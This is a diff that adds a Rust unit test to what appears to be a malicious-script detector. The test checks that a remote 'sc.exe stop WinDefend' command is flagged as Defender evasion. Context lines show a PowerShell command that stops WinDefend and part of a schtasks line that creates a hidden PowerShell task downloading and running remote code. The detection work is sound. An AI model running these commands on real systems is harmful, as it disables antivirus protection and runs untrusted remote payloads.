@@ -2829,6 +2829,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn sc_remote_quoted_defender_service_emits_defender_evasion_trait() {
+        let script = br#"sc.exe \\adminbox stop "WinDefend""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "sc-stop" && target == "WinDefend"
+            )),
+            "remote quoted sc service stop was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_stop_service_windefend_emits_defender_evasion_trait() {
         let script = br#"powershell -Command "Stop-Service WinDefend -Force""#;
         let report = analyze(script, &AnalyzeConfig::default());
